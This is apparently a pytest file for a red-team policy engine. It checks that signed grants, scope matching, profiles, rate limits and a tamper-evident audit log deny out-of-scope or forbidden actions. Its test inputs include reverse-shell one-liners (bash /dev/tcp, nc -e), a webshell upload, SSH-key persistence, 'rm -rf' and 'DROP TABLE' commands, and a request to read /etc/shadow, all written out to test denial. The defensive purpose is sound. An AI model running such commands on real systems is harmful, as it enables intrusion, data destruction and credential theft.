"""Authorized red-team mode: friction removed, hard invariants kept."""
from __future__ import annotations

import json
import time

import pytest

from core.policy.red_team import (
    ActionClass,
    ActionRequest,
    AuditLog,
    AuthorizationGrant,
    ForbiddenAction,
    Profile,
    RedTeamPolicyEngine,
    ScopeTarget,
    load_grant,
    save_grant,
)

SECRET = b"test-engagement-secret"


def _grant(scope=None, profiles=None, *, not_before=None, not_after=None):
    now = time.time()
    return AuthorizationGrant.sign(
        SECRET,
        grant_id="ENG-TEST",
        authorized_by="Test Operator",
        scope=scope or [ScopeTarget("domain", "example.com")],
        not_before=now - 60 if not_before is None else not_before,
        not_after=now + 3600 if not_after is None else not_after,
        profiles=profiles or [Profile.RED_TEAM],
    )


def _engine(grant=None, profile=Profile.RED_TEAM, **kwargs):
    return RedTeamPolicyEngine(grant or _grant(), profile, SECRET, **kwargs)


def test_red_team_allows_exploit_proof_without_approval():
    decision = _engine().evaluate(
        ActionRequest("https://example.com/login", ActionClass.EXPLOIT_PROOF, risk_level="critical")
    )
    assert decision.allowed is True
    assert decision.requires_approval is False
    assert "ENG-TEST" in decision.reason


def test_forbidden_actions_are_denied_even_in_red_team():
    engine = _engine()
    for action in ForbiddenAction:
        decision = engine.evaluate(
            ActionRequest(
                "https://example.com/",
                ActionClass.EXPLOIT_PROOF,
                forbidden_action=action,
            )
        )
        assert decision.allowed is False
        assert "hard invariant" in decision.reason


def test_forbidden_action_class_is_denied():
    decision = _engine().evaluate(
        ActionRequest("https://example.com/", ActionClass.FORBIDDEN)
    )
    assert decision.allowed is False


@pytest.mark.parametrize(
    "operation",
    [
        "DROP TABLE users",
        "DELETE FROM accounts",
        "UPDATE users SET role='admin'",
        "rm -rf /var/www",
        "shutdown -h now",
    ],
)
def test_destructive_operations_are_denied(operation):
    decision = _engine().evaluate(
        ActionRequest(
            "https://example.com/",
            ActionClass.EXPLOIT_PROOF,
            operation=operation,
        )
    )
    assert decision.allowed is False
    assert "destructive" in decision.reason


@pytest.mark.parametrize(
    "operation",
    [
        "upload webshell to /uploads/shell.php",
        "append key to /root/.ssh/authorized_keys",
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        "nc -e /bin/sh 1.2.3.4 4444",
        "crontab -e",
    ],
)
def test_backdoor_and_reverse_shell_patterns_are_denied(operation):
    decision = _engine().evaluate(
        ActionRequest(
            "https://example.com/",
            ActionClass.EXPLOIT_PROOF,
            operation=operation,
        )
    )
    assert decision.allowed is False
    assert "persistence" in decision.reason


@pytest.mark.parametrize(
    "operation",
    [
        "dump all password hashes",
        "read /etc/shadow",
        "exfiltrate customer database",
        "clear the logs after the test",
        "disable audit logging",
    ],
)
def test_exfiltration_and_evasion_are_denied(operation):
    decision = _engine().evaluate(
        ActionRequest(
            "https://example.com/",
            ActionClass.EXPLOIT_PROOF,
            operation=operation,
        )
    )
    assert decision.allowed is False


def test_out_of_scope_target_is_denied():
    decision = _engine().evaluate(
        ActionRequest("https://evil.example.org/", ActionClass.READ_ONLY)
    )
    assert decision.allowed is False
    assert "outside the authorized scope" in decision.reason


def test_domain_suffix_does_not_match_a_lookalike_domain():
    decision = _engine().evaluate(
        ActionRequest("https://evilexample.com/", ActionClass.READ_ONLY)
    )
    assert decision.allowed is False


def test_subdomain_is_in_scope():
    decision = _engine().evaluate(
        ActionRequest("https://api.example.com/v1/users", ActionClass.READ_ONLY)
    )
    assert decision.allowed is True


def test_expired_grant_is_denied():
    now = time.time()
    grant = _grant(not_before=now - 7200, not_after=now - 3600)
    decision = _engine(grant).evaluate(
        ActionRequest("https://example.com/", ActionClass.READ_ONLY)
    )
    assert decision.allowed is False
    assert "not valid at this time" in decision.reason


def test_tampered_grant_is_denied():
    grant = _grant()
    tampered = AuthorizationGrant(
        grant_id=grant.grant_id,
        authorized_by=grant.authorized_by,
        scope=grant.scope + (ScopeTarget("domain", "attacker.net"),),
        not_before=grant.not_before,
        not_after=grant.not_after,
        profiles=grant.profiles,
        signature=grant.signature,
    )
    decision = _engine(tampered).evaluate(
        ActionRequest("https://attacker.net/", ActionClass.READ_ONLY)
    )
    assert decision.allowed is False
    assert "signature is invalid" in decision.reason


def test_profile_must_be_listed_in_the_grant():
    grant = _grant(profiles=[Profile.SAFE])
    decision = _engine(grant, Profile.RED_TEAM).evaluate(
        ActionRequest("https://example.com/", ActionClass.READ_ONLY)
    )
    assert decision.allowed is False
    assert "does not authorize profile" in decision.reason


def test_safe_profile_denies_active_testing():
    grant = _grant(profiles=[Profile.SAFE])
    decision = _engine(grant, Profile.SAFE).evaluate(
        ActionRequest("https://example.com/", ActionClass.ACTIVE_TEST)
    )
    assert decision.allowed is False
    assert "does not allow action class" in decision.reason


def test_standard_profile_requires_approval_for_exploit_proof():
    grant = _grant(profiles=[Profile.STANDARD])
    decision = _engine(grant, Profile.STANDARD).evaluate(
        ActionRequest("https://example.com/", ActionClass.EXPLOIT_PROOF)
    )
    assert decision.allowed is False
    assert decision.requires_approval is True


def test_red_team_profile_enforces_its_rate_limit():
    engine = _engine(max_actions_per_minute=2)
    first = engine.evaluate(ActionRequest("https://example.com/a", ActionClass.READ_ONLY))
    second = engine.evaluate(ActionRequest("https://example.com/b", ActionClass.READ_ONLY))
    third = engine.evaluate(ActionRequest("https://example.com/c", ActionClass.READ_ONLY))
    assert first.allowed and second.allowed
    assert third.allowed is False
    assert "rate limit" in third.reason


def test_scope_target_matching_rules():
    assert ScopeTarget("domain", "example.com").matches("https://a.b.example.com/x")
    assert not ScopeTarget("domain", "example.com").matches("https://notexample.com/")
    assert ScopeTarget("host", "api.example.com").matches("api.example.com:8443")
    assert not ScopeTarget("host", "api.example.com").matches("example.com")
    assert ScopeTarget("cidr", "10.0.0.0/24").matches("http://10.0.0.7/admin")
    assert not ScopeTarget("cidr", "10.0.0.0/24").matches("http://10.0.1.7/admin")
    assert ScopeTarget("url", "https://example.com/app").matches(
        "https://example.com/app/users"
    )
    assert not ScopeTarget("url", "https://example.com/app").matches(
        "https://example.com/other"
    )


def test_audit_log_is_hash_chained_and_detects_tampering(tmp_path):
    path = tmp_path / "audit.jsonl"
    engine = _engine(audit_log=AuditLog(str(path)))
    engine.evaluate(ActionRequest("https://example.com/a", ActionClass.READ_ONLY))
    engine.evaluate(
        ActionRequest(
            "https://example.com/b",
            ActionClass.EXPLOIT_PROOF,
            operation="DROP TABLE users",
        )
    )

    reloaded = AuditLog(str(path))
    assert len(reloaded.records()) == 2
    assert reloaded.verify() is True

    reloaded._records[0]["allowed"] = False
    assert reloaded.verify() is False


def test_grant_round_trip(tmp_path):
    path = tmp_path / "grant.json"
    grant = _grant()
    save_grant(grant, str(path))
    loaded = load_grant(str(path))
    assert loaded == grant
    assert loaded.verify(SECRET) is True
    payload = json.loads(path.read_text(encoding="utf-8"))
    assert payload["scope"] == [{"kind": "domain", "value": "example.com"}]